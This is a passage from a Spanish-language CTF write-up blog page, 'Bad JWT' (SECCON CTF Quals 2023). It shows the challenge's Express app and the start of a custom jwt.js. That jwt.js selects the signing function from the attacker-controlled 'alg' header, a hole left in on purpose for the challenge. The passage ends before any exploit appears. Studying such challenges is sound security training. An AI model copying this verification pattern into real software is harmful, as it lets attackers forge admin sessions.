<!doctype html><html lang="es"><head><title>Bad JWT | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="SECCON CTF Quals 2023. Node.js. JWT. _Prototype Pollution_"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="SECCON CTF Quals 2023. Node.js. JWT. _Prototype Pollution_"><meta itemprop="keywords" content><meta itemprop="name" content="Bad JWT"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="SECCON CTF Quals 2023. Node.js. JWT. _Prototype Pollution_"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Bad JWT"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="SECCON CTF Quals 2023. Node.js. JWT. _Prototype Pollution_"><meta name="twitter:description" content="SECCON CTF Quals 2023. Node.js. JWT. _Prototype Pollution_"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Bad JWT"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src="/js/imc.js"></script><script>(async()=>await typeset(()=>[`#math-consts`]))()</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/seccon-ctf/bad-jwt/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- SECCON CTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/&amp;text=Bad%20JWT" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/seccon-ctf/bad-jwt/&amp;title=Bad%20JWT" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Bad JWT</h1><p class="mb4 f6 dib tracked">5 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li><li><a href="#solution">Solution</a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona el código fuente de un proyecto de Node.js. Este es <code>index.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">FLAG</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.FLAG </span><span class="mtk5">??</span><span class="mtk1"> </span><span class="mtk4">'SECCON{dummy}'</span><span class="mtk1">;</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">PORT</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'3000'</span><span class="mtk1">;;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'express'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">cookieParser</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'cookie-parser'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> jwt </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./jwt'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">app</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">();</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">urlencoded</span><span class="mtk1">({ </span><span class="mtk1">extended</span><span class="mtk1">: </span><span class="mtk6">false</span><span class="mtk1"> }));</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">cookieParser</span><span class="mtk1">());</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">secret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'crypto'</span><span class="mtk1">).</span><span class="mtk8">randomBytes</span><span class="mtk1">(</span><span class="mtk6">32</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">(</span><span class="mtk4">'hex'</span><span class="mtk1">);</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">((</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk8">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">.session;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> jwt.</span><span class="mtk8">verify</span><span class="mtk1">(</span><span class="mtk1">token</span><span class="mtk1">, </span><span class="mtk1">secret</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.session </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1">;</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk4">'Authentication failed'</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">})</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.isAdmin </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">FLAG</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">().</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk4">'You are not admin!'</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">});</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">listen</span><span class="mtk1">(</span><span class="mtk1">PORT</span><span class="mtk1">, () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">admin_session</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> jwt.</span><span class="mtk8">sign</span><span class="mtk1">(</span><span class="mtk4">'HS512'</span><span class="mtk1">, { </span><span class="mtk1">isAdmin</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1"> }, </span><span class="mtk1">secret</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">`[INFO] Use </span><span class="mtk5">${</span><span class="mtk1">admin_session</span><span class="mtk5">}</span><span class="mtk4"> as session cookie`</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">`Challenge server listening on port </span><span class="mtk5">${</span><span class="mtk1">PORT</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>
<span class="mtk1">});</span>
</code></pre></div><p>Y este es <code>jwt.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">crypto</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'crypto'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">base64UrlEncode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">str</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk9 mtki">str</span><span class="mtk1">)</span>
<span class="mtk1">    .</span><span class="mtk8">toString</span><span class="mtk1">(</span><span class="mtk4">'base64'</span><span class="mtk1">)</span>
<span class="mtk1">    .</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">/=</span><span class="mtk5">*$</span><span class="mtk4">/</span><span class="mtk5">g</span><span class="mtk1">, </span><span class="mtk4">''</span><span class="mtk1">)</span>
<span class="mtk1">    .</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">/</span><span class="mtk6">\+</span><span class="mtk4">/</span><span class="mtk5">g</span><span class="mtk1">, </span><span class="mtk4">'-'</span><span class="mtk1">)</span>
<span class="mtk1">    .</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">/</span><span class="mtk6">\/</span><span class="mtk4">/</span><span class="mtk5">g</span><span class="mtk1">, </span><span class="mtk4">'_'</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">base64UrlDecode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">str</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk9 mtki">str</span><span class="mtk1">, </span><span class="mtk4">'base64'</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">();</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">algorithms</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk8">hs256</span><span class="mtk1">: (</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span>
<span class="mtk1">    </span><span class="mtk8">base64UrlEncode</span><span class="mtk1">(</span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">createHmac</span><span class="mtk1">(</span><span class="mtk4">'sha256'</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">).</span><span class="mtk8">update</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">).</span><span class="mtk8">digest</span><span class="mtk1">()),</span>
<span class="mtk1">  </span><span class="mtk8">hs512</span><span class="mtk1">: (</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span>
<span class="mtk1">    </span><span class="mtk8">base64UrlEncode</span><span class="mtk1">(</span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">createHmac</span><span class="mtk1">(</span><span class="mtk4">'sha512'</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">).</span><span class="mtk8">update</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">).</span><span class="mtk8">digest</span><span class="mtk1">()),</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">stringifyPart</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">obj</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">base64UrlEncode</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">obj</span><span class="mtk1">));</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">parsePart</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">str</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk8">base64UrlDecode</span><span class="mtk1">(</span><span class="mtk9 mtki">str</span><span class="mtk1">));</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">createSignature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">header</span><span class="mtk1">, </span><span class="mtk9 mtki">payload</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span><span class="mtk5">${</span><span class="mtk8">stringifyPart</span><span class="mtk1">(</span><span class="mtk9 mtki">header</span><span class="mtk1">)</span><span class="mtk5">}</span><span class="mtk4">.</span><span class="mtk5">${</span><span class="mtk8">stringifyPart</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">)</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">signature</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">algorithms</span><span class="mtk1">[</span><span class="mtk9 mtki">header</span><span class="mtk1">.alg.</span><span class="mtk8">toLowerCase</span><span class="mtk1">()](</span><span class="mtk1">data</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">signature</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">parseToken</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">token</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">parts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">token</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">'.'</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">parts</span><span class="mtk1">.length </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid JWT format'</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> [ </span><span class="mtk1">header</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">, </span><span class="mtk1">signature</span><span class="mtk1"> ] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">parts</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">parsedHeader</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">parsePart</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">);</span>
